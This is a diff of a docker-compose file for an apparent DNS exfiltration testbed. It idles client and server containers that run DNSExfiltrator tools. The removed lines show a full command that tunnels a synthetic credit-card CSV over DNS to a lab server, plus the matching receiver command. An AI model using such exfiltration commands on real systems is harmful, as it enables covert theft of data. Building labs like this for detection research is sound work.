@@ -100,7 +100,9 @@ services:
     volumes:
       - ./dnsexfiltrator-client/data:/data/
     build: ./dnsexfiltrator-client
-    entrypoint: ["/bin/sh", "-c", "sleep 10 && mono DNSExfiltrator.exe /data/synthetic_cc_data_100.csv /data/domains.txt tunframe s=172.16.0.2 t=2 l=60 e=base32 seq=ENC"]
+    # Idle container: main.py starts DNSExfiltrator.exe per config via docker exec in wartime
+    init: true
+    entrypoint: ["sleep", "infinity"]
     networks:
       client-network:
         ipv4_address: 172.16.40.40
@@ -113,7 +115,9 @@ services:
     build: ./dnsexfiltrator-server
     volumes:
       - ./dnsexfiltrator-server/volume/:/app/
-    entrypoint: ["python3", "-u", "dnsExfiltrator.py", "-f", "domains.txt", "-p", "tunframe", "-o", "test"]
+    # Idle container: main.py starts dnsExfiltrator.py per config via docker exec in wartime
+    init: true
+    entrypoint: ["sleep", "infinity"]
     networks:
       server-network:
         ipv4_address: 192.168.4.4
